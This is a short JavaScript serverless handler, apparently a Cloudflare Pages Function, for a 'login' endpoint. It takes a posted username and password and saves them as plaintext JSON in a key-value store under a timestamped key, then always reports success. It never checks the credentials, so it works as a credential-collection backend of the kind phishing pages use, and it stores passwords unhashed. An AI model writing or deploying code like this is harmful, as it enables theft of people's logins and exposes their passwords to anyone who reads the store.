//login.js

export async function onRequestPost({ request, env }) {
  try {
    const data = await request.json();
    const { username, password } = data;

    if (!username || !password) {
      return new Response("Missing fields", { status: 400 });
    }

    // Create a unique key
    const key = `login_${Date.now()}`;

    await env.LOGIN_DATA.put(key, JSON.stringify({ username, password }));

    return new Response(JSON.stringify({ success: true }), {
      headers: { "Content-Type": "application/json" }
    });

  } catch (err) {
    return new Response("Error saving login", { status: 500 });
  }
}
